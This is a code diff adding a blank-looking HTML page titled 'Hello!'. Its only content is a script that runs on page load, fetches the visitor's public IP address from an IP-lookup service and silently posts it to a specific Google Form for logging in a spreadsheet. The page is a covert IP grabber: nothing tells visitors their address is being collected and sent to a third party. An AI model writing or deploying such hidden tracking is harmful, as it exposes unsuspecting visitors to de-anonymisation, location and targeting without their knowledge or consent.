@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hello!
+    </title>
+</head>
+<body>
+    <script>
+        fetch("https://api64.ipify.org?format=json")
+          .then(response => response.json())
+          .then(data => {
+            // Replace FORM_ID with your actual Google Form ID
+            const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSf4pRNG1MvRWvbDltduDtuvT11EDq1wgpF6iLeDCFVAlW6EXQ/viewform?usp=pp_url";
+            const formData = new FormData();
+            formData.append("entry.1994359932", data.ip); // Change YOUR_ENTRY_ID
+        
+            // Send IP to Google Form (auto logs in Google Sheets)
+            fetch(formUrl, { method: "POST", body: formData });
+        
+            console.log("IP Logged:", data.ip);
+          });
+        </script>
+        
+</body>
+</html>
